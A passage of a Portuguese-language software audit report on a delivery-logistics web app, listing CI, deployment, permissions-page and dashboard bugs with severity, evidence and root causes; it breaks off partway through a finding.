- **Arquivos:** `.env.example`, `.github/workflows/ci.yml`, `e2e/autocomplete.e2e.ts`, `e2e/helpers/auth.ts`, `e2e/livemap-route.e2e.ts`, `e2e/mfa.e2e.ts`, `e2e/new-order-autocomplete.e2e.ts`, `e2e/rbac.e2e.ts`, `playwright.config.ts`
- **Etapas do plano:** 027

#### A-047 — A CI da `main` está vermelha há três execuções e o AGENTS.md afirma por escrito que está verde

- **Camada:** Infra, CI e deploy
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O próximo agente de IA lê no manual do projeto que a integração contínua está verde, não confere, e passa a trabalhar sobre uma base que já está quebrada — e o teste que detecta edge quebrada em produção não impede nenhum merge.
- **Evidência:**
  ```
  API do GitHub: runs `#985` (22/11 19:45), `#986` e `#987` (22/11 22:42) do workflow `CI/CD` na `main` com `conclusion: failure`. O job que falha é `Deno Edge Function I/O Integration Tests` (job 137383525344): `FAILED | 21 passed | 3 failed`, com `AssertionError: Values are not equal: esperado 422, recebido 500 ({"error":"Internal server error"})`. `AGENTS.md` (Fluxo Git) diz: "a CI da `main` está verde desde 21/11/2026 (runs #466+); qualquer vermelho agora é regressão real e bloqueia o merge". Os 7 required checks da `main` (confirmados pela API) **não incluem** esse job, então o vermelho não bloqueia merge nenhum.
  ```
- **Causa raiz:** Dois problemas somados: o job que testa as edges publicadas não é required check, e a instrução que os agentes leem como verdade (`AGENTS.md`) não é atualizada quando o estado muda.
- **Arquivos:** `AGENTS.md`, `.github/workflows/ci.yml`
- **Etapas do plano:** 086

#### A-064 — O guarda que vigia as configurações do GitHub dá "tudo certo" quando o token é recusado

- **Camada:** Infra, CI e deploy
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O alarme que existia para avisar que o repositório virou público não dispara. Foi assim que a mudança passou em branco: o guarda não consegue ver e ainda assim diz que está tudo certo.
- **Evidência:**
  ```
  Rodado nesta sessão: `node scripts/ci/github-settings-guard.mjs` imprime 6 linhas `::warning::PONTO CEGO … 401 … token recusado` e termina com `OK: perimetro igual ao baseline (6 ponto(s) cego(s) declarado(s), nenhuma divergencia)` e **exit 0**. O fail-closed existe só para token AUSENTE (`scripts/ci/github-settings-guard.mjs:236-239`: `ERRO: GITHUB_TOKEN ausente — sem token nao da para ler o perimetro (fail-closed)`), não para 401. E o baseline declara `"private": true` / `"visibility": "private"` (`scripts/ci/github-settings-baseline.json`), divergente da realidade.
  ```
- **Causa raiz:** O guarda trata falha de autenticação (401) como "ponto cego declarado" em vez de erro. Um token expirado, revogado ou sem escopo produz exatamente o mesmo resultado que um perímetro íntegro: verde.
- **Arquivos:** `scripts/ci/github-settings-guard.mjs`, `scripts/ci/github-settings-baseline.json`
- **Etapas do plano:** 270

#### M-032 — Migration só é aplicada à mão, com o nome do arquivo digitado, enquanto o código sobe sozinho no merge

- **Camada:** Infra, CI e deploy
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Hoje o banco está em dia, então isso não é uma falha ativa — é o jeito como a próxima quebra vai acontecer: uma PR com migration mergeia, o site atualiza na hora, a migration fica para trás e a tela nova quebra em produção sem ninguém entender por quê.
- **Evidência:**
  ```
  `.github/workflows/apply-migrations.yml:9-19`: o único gatilho é `workflow_dispatch`, com a lista de arquivos digitada no input `files`. Já o código vai para produção sozinho (Vercel no merge e `deploy-edges.yml` com `supabase functions deploy --yes`, que publica TODAS as funções). Estado real do ledger, lido no log do run #7 do `apply-migrations` (22/11 14:08:55 UTC, passo "Ledger antes"): topo = `20261124120000 internal_alert_channels`, `20261123200000`, `20261123190002`, `20261123190001`, `20261123190000` — ou seja, **a migration mais nova do repo está aplicada hoje**. Precedente de falha no próprio repo: `supabase/migrations/20261123170000_indices_fk_faltantes.sql:1-4` documenta que a `20261121201800` "nunca foi aplicada em produção".
  ```
- **Causa raiz:** Não existe gate entre "código novo em produção" e "schema que o código novo espera". O apply depende de alguém lembrar de rodar o workflow com o nome exato do arquivo; esquecer não gera erro, gera código rodando contra schema antigo.
- **Arquivos:** `.github/workflows/apply-migrations.yml`, `.github/workflows/deploy-edges.yml`
- **Etapas do plano:** 111

#### M-036 — xlsx vem de tarball fora do registro npm: build, typecheck e teste caem juntos quando cdn.sheetjs.com nao responde, e o npm audit nao enxerga a dependencia

- **Camada:** Infra, CI e deploy
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Um servidor de terceiro fora do ar trava todo o pipeline — ninguem consegue mergear nem publicar correcao urgente — e a biblioteca que gera as planilhas do sistema fica fora de qualquer alerta de seguranca.
- **Evidência:**
  ```
  package.json:98 `"xlsx": "https://cdn.sheetjs.com/xlsx-0.20.3/xlsx-0.20.3.tgz"`; package-lock.json:13548 `"resolved": "https://cdn.sheetjs.com/xlsx-0.20.3/xlsx-0.20.3.tgz"`; src/utils/exportUtils.ts:5 `import * as XLSX from 'xlsx';`; .github/dependabot.yml:3-7 (`package-ecosystem: "npm"` generico, sem tratamento de dependencia por URL).
  ```
- **Causa raiz:** Dependencia por URL: o `npm ci` resolve esse unico pacote fora do registro npm, sem mirror nem fallback. Se o host cair, mudar o caminho do arquivo ou for bloqueado pela rede do runner, o `npm ci` falha inteiro — e com ele os 5 jobs que o executam (lint-and-typecheck, test, e2e, build, guard-agents-md), ou seja 5 dos 7 required checks. Efeito colateral de seguranca: `npm audit` so consulta o registro, entao uma vulnerabilidade no xlsx nunca aparece no job `security`, e o Dependabot (.github/dependabot.yml) tambem nao abre PR para dependencia por URL.
- **Arquivos:** `package.json`, `package-lock.json`, `src/utils/exportUtils.ts`, `.github/workflows/ci.yml`, `.github/dependabot.yml`
- **Etapas do plano:** 115

#### M-068 — Nao existe vercel.json nem fallback de SPA no repositorio, com 58 rotas em BrowserRouter

- **Camada:** Infra, CI e deploy
- **Severidade:** Média · **Confiança:** hipotese · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Link direto para uma tela interna compartilhado com alguem que nunca abriu o sistema pode cair em pagina de erro, mesmo com o usuario tendo acesso.
- **Evidência:**
  ```
  `ls vercel.json` → No such file or directory; public/ sem _redirects (favicon.ico, manifest.json, placeholder.svg, robots.txt, sw.js); src/App.tsx:6 e :228 com BrowserRouter e 58 ocorrências de `<Route`; public/sw.js:89-95 (fallback de navegação só para quem tem cache). A frase 'a main deste repo não tem vercel.json' está em .github/workflows/contexto.yml:416 (não :24 — essa linha trata de branch protection e do vercel.json gravado em :417-419 na branch gerada).
  ```
- **Causa raiz:** Hospedagem estatica de SPA precisa de rewrite de todas as rotas para /index.html; o preset de Vite na Vercel nao adiciona esse fallback sozinho (ao contrario do preset de CRA). O service worker public/sw.js:90-91 tem fallback de navegacao para `/index.html` em cache, o que mascara o problema para quem ja visitou o site — mas a primeira visita a um link profundo (link compartilhado, aba anonima, QR) vai direto ao servidor.
- **Arquivos:** `src/App.tsx`, `public/sw.js`, `.github/workflows/contexto.yml`
- **Etapas do plano:** 150
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: Falta um request real a producao a uma rota profunda em sessao limpa (ex.: `curl -I https://<dominio>/pedidos` e conferir 200 + text/html em vez de 404) e a leitura das configuracoes do projeto na Vercel — o MCP da Vercel responde 404 not_found em GET /v9/projects/lalamove-v2 (escopo da conexao), mesmo limite ja registrado em scripts/ci/vercel-env-baseline.json.

#### M-109 — Os jobs de SQL testam a migration por faixas de linha fixas (sed -n '277,345p')

- **Camada:** Infra, CI e deploy
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** A rede de protecao do codigo que decide chegada e atraso depende de contagem de linhas de um arquivo; uma edicao inocente a transforma em teste que nao testa (ou em falha confusa que vira ruido).
- **Evidência:**
  ```
  .github/workflows/ci.yml:234 `sed -n '277,345p' supabase/migrations/20261122130100_geo_foundation.sql \`; ci.yml:270-272 `for range in 277,341 347,387 389,533; do` + `sed -n "${range}p" "$MIG" \`. Agravante: supabase/migrations/20261122131000_geo_eta_delay.sql:40 `CREATE OR REPLACE FUNCTION public.geo_evaluate_tracking()` redefine a funcao que a faixa 389,533 copia da migration antiga.
  ```
- **Causa raiz:** Os jobs `Geo geometry SQL tests` e `Geo trigger SQL tests` nao aplicam a migration: recortam dela os blocos de funcao por numero de linha. Conferi que as faixas hoje caem certo (L277 abre `CREATE OR REPLACE FUNCTION public.geo_haversine_m`, L341 fecha `END; $$;`, L347 abre `geo_emit_event`, L389 abre `geo_evaluate_tracking`, L533 fecha o `CREATE TRIGGER`), mas o acoplamento e por posicao: inserir uma linha no inicio do arquivo desloca tudo e o psql passa a receber SQL truncado. Alem disso, nada fora dessas faixas e exercitado — RLS, grants e as linhas de `alert_configurations` da secao 10 nunca entram no Postgres de teste.
- **Arquivos:** `.github/workflows/ci.yml`, `supabase/migrations/20261122130100_geo_foundation.sql`, `supabase/tests/geo_functions.test.sql`, `supabase/tests/geo_trigger.test.sql`, `supabase/tests/fixtures/geo_trigger_schema.sql`
- **Etapas do plano:** 225

#### B-056 — Atualização automática de dependência vulnerável está desligada num repositório público

- **Camada:** Infra, CI e deploy
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Uma falha conhecida numa biblioteca pode ficar meses sem correção sem que nada avise, num repositório que está aberto ao público.
- **Evidência:**
  ```
  `GET /repos/adm01-debug/Lalamove_V2`: `"security_and_analysis": { "secret_scanning": {"status":"enabled"}, "secret_scanning_push_protection": {"status":"enabled"}, "dependabot_security_updates": {"status":"disabled"}, … }`. O job `security` do `ci.yml` roda `npm audit --audit-level=critical`, ou seja, vulnerabilidade **high** passa verde. `npm audit` no conjunto instalado nesta sessão: 0 vulnerabilidades (sem o pacote `xlsx`, que o proxy bloqueou).
  ```
- **Causa raiz:** A atualização automática de segurança nunca foi ligada, e o limite do `npm audit` no CI está em `critical`, duas casas acima do que a maioria dos avisos reais usa.
- **Arquivos:** `.github/workflows/ci.yml`, `.github/dependabot.yml`
- **Etapas do plano:** 293


## Interface — administração

**3 achado(s).**


#### A-041 — Salvar permissões sempre falha: a chave do pendingChanges é quebrada por split('-') em UUID

- **Camada:** Interface — administração
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** A tela de permissões por papel não grava nada. Quem tenta dar ou tirar acesso de gerente/operador/visualizador recebe erro genérico e acredita que o sistema está travado — na prática os acessos continuam exatamente como estavam.
- **Evidência:**
  ```
  src/pages/PermissionsPage.tsx:109 `const [role, permissionId] = key.split('-') as [AppRole, string];` + :111-113 `if (value) await supabase.from('role_permissions').insert({ role, permission_id: permissionId }); else await supabase.from('role_permissions').delete().eq('role', role).eq('permission_id', permissionId);` (retorno `{ error }` ignorado) + migration 20251231115949_...sql:25 `id UUID PRIMARY KEY DEFAULT gen_random_uuid()`
  ```
- **Causa raiz:** A chave composta usa '-' como separador, mas o permission_id é um UUID que contém '-'. O destructuring devolve role='manager' e permissionId='550e8400' (só o 1º bloco do UUID). O insert/delete em role_permissions vai com um UUID inválido; o Postgres recusa (22P02), o loop lança no 1º item e o catch mostra só 'Erro ao salvar'. Nenhuma permissão é gravada e pendingChanges não é limpo.
- **Arquivos:** `src/pages/PermissionsPage.tsx`
- **Etapas do plano:** 080

#### M-096 — Editar configuração de alerta sobrescreve o que outra aba salvou e perde a edição se o salvamento falhar

- **Camada:** Interface — administração
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** Dois gerentes ajustando os destinatários do mesmo alerta: o último a salvar apaga a alteração do primeiro sem aviso. E se a internet cair no momento de salvar, o texto do template digitado é perdido e é preciso escrever tudo de novo.
- **Evidência:**
  ```
  src/pages/alert-configurations/AlertConfigCard.tsx:91-95 (estado inicial único), :138 (`setIsEditing(true)` sem reinit), :106 (save + fechamento imediato), :168 (Dialog, estado fora dele); src/hooks/useAlertConfigurations.ts:50-64 (update sem concorrência) e :116-120 (staleTime 1h); src/pages/IPWhitelistPage.tsx:77,84-85 (aqui sim há descarte do digitado).
  ```
- **Causa raiz:** O estado do formulário nasce do `config` do primeiro render e nunca é sincronizado quando a query é revalidada (useAlertConfigurations usa `staleTime` de 1 hora, src/hooks/useAlertConfigurations.ts:116-120). O update é cego — `.update(...).eq('id', id)` sem comparar `updated_at` (mesmo arquivo, :50-64). E o `setIsEditing(false)` roda antes da resposta, então um erro de rede só aparece como toast, com o conteúdo digitado já descartado.
- **Arquivos:** `src/pages/alert-configurations/AlertConfigCard.tsx`, `src/hooks/useAlertConfigurations.ts`, `src/pages/IPWhitelistPage.tsx`
- **Etapas do plano:** 191

#### B-014 — Classes de cor montadas em tempo de execução não existem no CSS final

- **Camada:** Interface — administração
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** Os cartões de resumo (total/ativos/inativos na whitelist, pendentes/aprovados/rejeitados nas aprovações) aparecem sem a cor que distingue cada situação, deixando a leitura rápida da tela mais difícil.
- **Evidência:**
  ```
  src/pages/IPWhitelistPage.tsx:141,144; src/pages/ApprovalsPage.tsx:69,72,74; src/pages/approvals/ApprovalCard.tsx:64,66,67; tailwind.config.ts:4-6 (sem safelist); classes ausentes de todo o src/: `bg-muted-foreground/10`, `border-muted-foreground/30`
  ```
- **Causa raiz:** O Tailwind gera as classes varrendo strings literais do código; nomes concatenados em tempo de execução nunca entram no CSS e, sem safelist, as classes simplesmente não existem. Os ícones e números ficam sem a cor pretendida.
- **Arquivos:** `src/pages/IPWhitelistPage.tsx`, `src/pages/ApprovalsPage.tsx`, `src/pages/approvals/ApprovalCard.tsx`
- **Etapas do plano:** 169
- **Divergência entre revisores:** um revisor refutou e outro confirmou: CONFIRMA: Reli os três pontos e a interpolação existe exatamente como descrito: src/pages/IPWhitelistPage.tsx:141 (`cn("p-3 rounded-xl", `bg-${stat.color}/10`)` + `text-${stat.color}` nas linhas 141 e 144), src/pages/ApprovalsPage.tsx:69-72 (`from-${stat.color} to-${stat.color}/50`, `bg-${stat.color}/10 borde || CONFIRMA: As três interpolações existem como descrito: src/pages/IPWhitelistPage.tsx:141 (`bg-${stat.color}/10`, `text-${stat.color}`, cores 'primary'|'success'|'muted-foreground' nas linhas 134-136), src/pages/ApprovalsPage.tsx:69-74 (`from-${color}`, `to-${color}/50`, `bg-${color}/10 border-${color}/30`, co || REFUTA: EXECUTADO (grep de ocorrências literais em src/) + RASTREADO. A premissa do mecanismo está errada: o Tailwind varre TODOS os arquivos de `content` (tailwind.config.ts:6 `content: ["./pages/**/*.{ts,tsx}", ... "./src/**/*.{ts,tsx}"]`) e gera qualquer classe que apareça literalmente em QUALQUER arquiv


## Interface — fluxo de pedido

**4 achado(s).**


#### M-077 — Operadores de busca documentados na propria tela de pedidos nunca funcionam

- **Camada:** Interface — fluxo de pedido
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** A ajuda da propria tela ensina uma sintaxe que sempre devolve 'Nenhum pedido encontrado'. O operador conclui que nao ha pedidos do tipo que procura.
- **Evidência:**
  ```
  src/pages/OrdersPage.tsx:213 (SearchInputWithHelp) | src/hooks/useRecentOrders.ts:36-38 `if (query && query.trim()) { supabaseQuery = supabaseQuery.or(`lalamove_id.ilike.%${query}%,...`); }` | src/hooks/useFuseSearch.ts:170-186 (EXTENDED_SEARCH_HELP) | src/components/ui/search-help-tooltip.tsx:68-69 (renderiza os operadores)
  ```
- **Causa raiz:** O termo digitado e gravado na URL (OrdersPage.tsx:36-52) e usado primeiro como filtro `ilike` literal no banco. So o que sobrevive a esse filtro chega ao Fuse (OrdersPage.tsx:89-101). Como '^ORD-' nao existe como substring em nenhum campo, o banco devolve zero linhas e o Fuse — unico que entende esses operadores — nao recebe nada para filtrar.
- **Arquivos:** `src/pages/OrdersPage.tsx`, `src/hooks/useFuseSearch.ts`, `src/components/ui/search-help-tooltip.tsx`, `src/hooks/useRecentOrders.ts`
- **Etapas do plano:** 159

#### B-030 — Download do comprovante abre a janela depois do await e falha calado quando o navegador bloqueia

- **Camada:** Interface — fluxo de pedido
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O operador clica em 'Comprovante', nada abre e nada e dito; o documento financeiro parece indisponivel quando na verdade ja foi obtido.
- **Evidência:**
  ```
  src/components/lalamove/UapiOrderHistoryPanel.tsx:26-27 `const url = await receipt.mutateAsync(orderUuid);` / `window.open(url, '_blank', 'noopener,noreferrer');`
  ```
- **Causa raiz:** O `window.open` ocorre depois de uma chamada assincrona, fora da janela de gesto do usuario; nesse caso o navegador bloqueia o popup, `window.open` devolve null e o codigo nao testa o retorno — nenhum erro e lancado, entao o catch tambem nao ajuda.
- **Arquivos:** `src/components/lalamove/UapiOrderHistoryPanel.tsx`
- **Etapas do plano:** 212

#### B-047 — Cupons e frota da conta Lalamove mostram so a primeira pagina, sem indicacao de que ha mais

- **Camada:** Interface — fluxo de pedido
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Com mais de 20 cupons ou mais de 50 motoristas bloqueados, o resto fica invisivel: nao da para resgatar o cupom que nao aparece nem desbloquear um motorista fora da primeira pagina, e a tela nao avisa que ha mais.
- **Evidência:**
  ```
  src/components/lalamove/UapiCouponsPanel.tsx:15; src/hooks/useLalamoveUapi.ts:79 (`const PAGE_SIZE = 20;`), :202-206 e :250 (`{ page_no: 1, page_size: 50, ... }`); o consumo da frota é em src/components/lalamove/UapiFleetPanel.tsx:22 (`useUapiFleet(kind, search || undefined)`), não em :108-111, que é só o render das abas; padrões vizinhos em UapiStatementPanel.tsx:13 e :115-133 e UapiOrderHistoryPanel.tsx:95-111
  ```
- **Causa raiz:** Os dois paineis fixam a primeira pagina. Os paineis vizinhos da mesma tela resolveram isso: o de extrato tem controles de pagina (UapiStatementPanel.tsx:13 `const [page, setPage] = useState(1);`) e o de historico tem 'Carregar mais' (UapiOrderHistoryPanel.tsx:95-111).
- **Arquivos:** `src/components/lalamove/UapiCouponsPanel.tsx`, `src/components/lalamove/UapiFleetPanel.tsx`, `src/hooks/useLalamoveUapi.ts`
- **Etapas do plano:** 267

#### B-063 — Componente Badge importado e nunca usado na tela de pedidos

- **Camada:** Interface — fluxo de pedido
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Nenhum efeito visivel para o usuario; e so peso morto no pacote entregue ao navegador e ruido para quem for mexer na tela.
- **Evidência:**
  ```
  src/pages/OrdersPage.tsx:4 `import { Badge } from '@/components/ui/badge';` (unica ocorrencia; eslint: 4:10 warning 'Badge' is defined but never used)
  ```
- **Causa raiz:** Sobra da extracao do cartao de pedido para src/pages/orders/OrderCard.tsx, onde o Badge realmente e usado (OrderCard.tsx:77).
- **Arquivos:** `src/pages/OrdersPage.tsx`
- **Etapas do plano:** 300


## Interface — mapa e rastreamento

**2 achado(s).**


#### M-092 — Google Earth 3D falha calado: biblioteca maps3d não é carregada com a chave própria e nenhuma mensagem ou fallback aparece

- **Camada:** Interface — mapa e rastreamento
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Quem escolher 'Google Earth 3D' no seletor de mapa pode ficar com um retângulo vazio, sem aviso e sem volta automática para o mapa 2D — parece que o sistema quebrou.
- **Evidência:**
  ```
  src/components/map/Google3DCanvas.tsx:47-50 `await importLib('maps3d');` / `} catch {` / `return;` / `}`; src/components/map/hooks/useGoogleMapsLoader.ts:79 `v: USING_OWN_KEY ? 'weekly' : 'beta',`; src/components/map/MapProviderSelector.tsx:27 `{ id: 'google-3d', label: 'Google Earth 3D', icon: Globe, hint: 'Beta' },`
  ```
- **Causa raiz:** Com `VITE_GOOGLE_MAPS_BROWSER_KEY` definida (`USING_OWN_KEY`), o script do Google é carregado no canal `weekly` e sem a biblioteca `maps3d` — o próprio comentário do arquivo (useGoogleMapsLoader.ts:74-76) diz que `maps3d` 'nao sai no canal estavel'. Quando `importLibrary('maps3d')` rejeita, o Google3DCanvas apenas retorna: não seta erro, não chama `onFallback` (prop existe e está ligada em LiveMap.tsx:585 `onFallback={() => useMapSettings.getState().setPreferredProvider('google-hybrid')}`), e o overlay de loading já saiu porque `ready` é true. Sobra um `<div>` vazio ocupando a tela.
- **Arquivos:** `src/components/map/Google3DCanvas.tsx`, `src/components/map/hooks/useGoogleMapsLoader.ts`, `src/components/map/MapProviderSelector.tsx`
- **Etapas do plano:** 187

#### M-093 — Provedor de mapa decidido por duas regras diferentes: mapa ao vivo segue a preferência do usuário, mini-mapa do pedido segue só a política do admin

- **Camada:** Interface — mapa e rastreamento
- **Severidade:** Média · **Confiança:** hipotese · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O mesmo pedido pode aparecer com mapa de um fornecedor na tela de rastreamento e de outro no detalhe do pedido, e em alguns casos o sistema paga pelos dois ao abrir uma única tela.
- **Evidência:**
  ```
  src/components/map/OrderTrackingMap.tsx:75-76 `const { data: tilesProvider } = useTilesProvider();` / `const useGoogle = tilesProvider === 'google';`; :159 `if (useGoogle) return;`; :202 `}, [mapboxToken]);`; :241 `}, [useGoogle]);`; src/hooks/useMapProviderPolicy.ts:43 `if (tilesProvider === 'off') return all;`
  ```
- **Causa raiz:** `useEffectiveMapProvider` (src/hooks/useMapProviderPolicy.ts:62-66) combina a escolha persistida do usuário com o que o admin liberou, e com `geo_settings.tiles` ausente/'off' a política é fail-open (linhas 18-21, 43) — ou seja, vale a preferência do usuário. O OrderTrackingMap ignora a preferência e olha apenas `tiles === 'google'`. As duas telas da mesma sessão podem então renderizar provedores diferentes. Pior: o efeito que instancia o Mapbox no mini-mapa depende só do token (OrderTrackingMap.tsx:202 `}, [mapboxToken]);`), então uma mudança de `useGoogle` depois da criação não desmonta o mapa Mapbox e o canvas Google é montado no mesmo `container.current` (linha 220), com dois `countMapLoad` contados (linhas 169 e 228).
- **Arquivos:** `src/components/map/LiveMap.tsx`, `src/components/map/OrderTrackingMap.tsx`, `src/hooks/useMapProviderPolicy.ts`
- **Etapas do plano:** 188
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: Não há MCP apontando para o projeto oficial iecgydonctmabiijadsf (AGENTS.md), então não pude ler a linha `geo_settings.tiles` de produção: se hoje ela estiver em 'google' ou 'mapbox', a divergência entre as duas telas é imediata; se estiver ausente/'off', a divergência só aparece quando o usuário troca de provedor no seletor. O empilhamento dos dois canvas depende de qual resposta chega primeiro (token do Mapbox x query de tiles) e precisa ser observado no browser.


## Interface — painéis e relatórios

**5 achado(s).**


#### A-044 — SLO: disponibilidade soma falhas que não estão no total de requisições e pode ficar negativa; o gráfico usa outra fórmula

- **Camada:** Interface — painéis e relatórios
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** O indicador principal de disponibilidade pode exibir valor impossível (negativo) e, em todo caso, discorda do gráfico logo abaixo, inutilizando a página para decidir se houve violação de SLO.
- **Evidência:**
  ```
  src/hooks/useSLOMetrics.ts:161-165 (origem de runtime_error_logs), :188 (frontendErrors), :191-192 (populações diferentes), :209-211 (sem clamp), :269-288 (buckets sem frontendErrors).
  ```
- **Causa raiz:** `frontendErrors` é a soma de `occurrence_count` de runtime_error_logs — uma população que não compõe o denominador. Um pico de erros de frontend derruba a disponibilidade abaixo de zero e eleva a taxa de falhas acima de 100%. Os buckets do gráfico ignoram essa parcela, então o número do card e a linha do gráfico nunca batem.
- **Arquivos:** `src/hooks/useSLOMetrics.ts`, `src/pages/SLODashboardPage.tsx`
- **Etapas do plano:** 083

#### M-061 — Gráficos diários usam o dia em UTC enquanto o rótulo é o dia local: pedidos da noite caem no dia seguinte e a tendência exibe a data errada

- **Camada:** Interface — painéis e relatórios
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Todo pedido feito depois das 21h aparece no dia seguinte, e o gráfico de tendência mostra as barras deslocadas um dia. Pico de demanda da noite é atribuído ao dia errado em qualquer comparação.
- **Evidência:**
  ```
  src/hooks/useAnalyticsData.ts:46-47 — `const dateStr = format(date, 'yyyy-MM-dd');` / `const dayOrders = orders.filter(o => o.created_at?.startsWith(dateStr));`; src/hooks/useDeliveryMetrics.ts:210 — `const dateStr = date.toISOString().split('T')[0];`; src/hooks/useDeliveryMetrics.ts:216 — `const dateStr = order.created_at.split('T')[0];`; src/pages/DeliveryMetricsPage.tsx:44 — `dateLabel: new Date(t.date).toLocaleDateString('pt-BR', { weekday: 'short', day: '2-digit' })`
  ```
- **Causa raiz:** `created_at` chega como ISO em UTC; comparar/cortar a string agrupa por dia UTC, mas o eixo é rotulado com o dia local (UTC-3). Em DeliveryMetricsPage o efeito aparece no rótulo: `new Date('2026-11-22')` é meia-noite UTC e, formatado em pt-BR, imprime 21/11.
- **Arquivos:** `src/hooks/useAnalyticsData.ts`, `src/hooks/useDeliveryMetrics.ts`, `src/pages/DeliveryMetricsPage.tsx`
- **Etapas do plano:** 140

#### M-062 — Monitoramento de Cache esconde justamente as views com falha e mostra "última verificação" da view errada

- **Camada:** Interface — painéis e relatórios
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** A tela diz "1 view com falha" e não mostra qual nem oferece como corrigir; e a "última verificação" exibida pode ser de horas antes da real. Dado agregado desatualizado continua alimentando os outros painéis sem que ninguém consiga agir.
- **Evidência:**
  ```
  src/hooks/useCacheViews.ts:52,107-116; src/pages/CacheMonitoringPage.tsx:63,69,163-205,197-200; referencia correta em src/pages/CacheStatusPage.tsx:125-153
  ```
- **Causa raiz:** useCacheViews filtra para `status === 'success'`, então as views com falha ou nunca atualizadas entram no contador "Com Falha" mas não viram card — e é no card que fica o botão "Atualizar". O `lastChecked` pega a primeira view em ordem alfabética, não a mais recente.
- **Arquivos:** `src/hooks/useCacheViews.ts`, `src/pages/CacheMonitoringPage.tsx`
- **Etapas do plano:** 141

#### M-099 — KPI "Taxa Auto-Aprovação" compara fila por pedido com total de motoristas e trava em 0%

- **Camada:** Interface — painéis e relatórios
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O indicador que mostraria quantas aprovações o sistema resolve sozinho fica permanentemente em 0%, sugerindo que nenhuma automação funciona e escondendo o ganho (ou a perda) real do fluxo de aprovação.
- **Evidência:**
  ```
  src/hooks/useMetrics.ts:130-136 — `const { count: driversInQueue } = await supabase.from('driver_approval_queue').select('driver_id', { count: 'exact', head: true });` / `const autoApprovalRate = totalDrivers && driversInQueue !== null ? ((totalDrivers - driversInQueue) / totalDrivers) * 100 : 0;`; src/hooks/useMetrics.ts:143 — `autoApprovalRate: Math.max(0, autoApprovalRate),`; supabase/functions/evaluate-driver/index.ts:770-773 — `await supabase.from('driver_approval_queue').insert({ driver_id: driverId, driver_name: evaluatedDriver.name, order_id: orderId,`; supabase/migrations/20251224143803_3b1f0374-1b95-4fba-a31b-f44a9fd14494.sql:174-175 — `driver_id UUID REFERENCES public.drivers(id) ON DELETE CASCADE NOT NULL, order_id UUID REFERENCES public.lalamove_orders(id) ON DELETE CASCADE NOT NULL,`
  ```
- **Causa raiz:** `driversInQueue` conta LINHAS da fila (uma por pedido que exigiu aprovação), não motoristas distintos. Como o volume de pedidos cresce acima do número de motoristas, a subtração fica negativa e o `Math.max(0, …)` fixa o indicador em 0,0%.
- **Arquivos:** `src/hooks/useMetrics.ts`, `src/pages/MetricsPage.tsx`
- **Etapas do plano:** 194

#### M-129 — SLO: o "orçamento de erro" da latência não é orçamento — indicador saudável aparece com 0% livre

- **Camada:** Interface — painéis e relatórios
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** O cartão de latência diz "Saudável" e, logo abaixo, "0% livre" com a barra vermelha — leitura contraditória que faz o dono achar que há violação onde não há.
- **Evidência:**
  ```
